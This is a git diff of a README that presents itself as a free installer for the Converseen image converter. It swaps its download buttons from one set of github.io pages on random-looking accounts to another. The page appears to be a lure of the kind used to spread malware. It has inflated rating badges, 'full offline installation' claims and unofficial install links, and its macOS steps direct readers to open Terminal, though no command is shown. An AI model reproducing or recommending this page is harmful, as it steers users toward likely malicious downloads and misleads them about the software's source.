@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Batch+Image+Converter-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Image+Converter-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Converseen Free Installer** — Converseen is a free, open-source batch image converter and resizer for Windows and Linux. Works without internet access, no account required. Full offline installation.
+**💻 Converseen Free Installer** — Converseen is a free, cross-platform batch image converter and resizer for Windows, Linux, and macOS. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Converseen](https://img.shields.io/badge/⬇_Install_Converseen-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Converseen](https://img.shields.io/badge/⬇_Install_Converseen-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Converseen
 
-Converseen is a free, open-source batch image converter and resizer for Windows and Linux. Convert between dozens of image formats, resize, rotate, flip, and apply simple filters to entire folders of images in one operation. Converseen's straightforward interface makes batch image conversion accessible without scripting or command-line knowledge.
+Converseen is a free, cross-platform batch image converter and resizer for Windows, Linux, and macOS. It converts between 100+ image formats, supports batch resize and rotation, and provides a simple interface powered by the ImageMagick library.
 
 ---
 
 ## ❌ Problem: Converseen is hard to access
 
-- **Limited Platform** — Windows and Linux; no macOS version
-- **Feature Scope** — Basic conversion and resizing; no advanced editing capabilities
-- **Advanced Operations** — Complex per-image adjustments not supported in batch mode
-- **Performance** — Very large batch operations can be slow
+- **ImageMagick Backend** — Quality and format support dependent on ImageMagick capabilities
+- **Basic Interface** — Functional but minimal; fewer options than commercial batch tools
+- **Limited Editing** — Conversion and resize only; no color correction or adjustment tools
+- **macOS Instability** — macOS version sometimes less stable than Windows or Linux builds
 
 ---
 
@@ -61,9 +61,9 @@ Converseen is a free, open-source batch image converter and resizer for Windows 
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Converseen is a free, open-source batch image converter and resizer for Windows 
 
 <div align="center">
 
-[![⬇ Install Converseen](https://img.shields.io/badge/⬇_Install_Converseen-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Converseen](https://img.shields.io/badge/⬇_Install_Converseen-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Converseen is a free, open-source batch image converter and resizer for Windows 
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Converseen is a free, open-source batch image converter and resizer for Windows 
 
 ---
 
-**Converseen Free Installer** — Converseen is a free, open-source batch image converter and resizer for Windows and Linux. Install without internet connection today!
+**Converseen Free Installer** — Converseen is a free, cross-platform batch image converter and resizer for Windows, Linux, and macOS. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Converseen](https://img.shields.io/badge/⬇_Install_Converseen-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Converseen](https://img.shields.io/badge/⬇_Install_Converseen-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
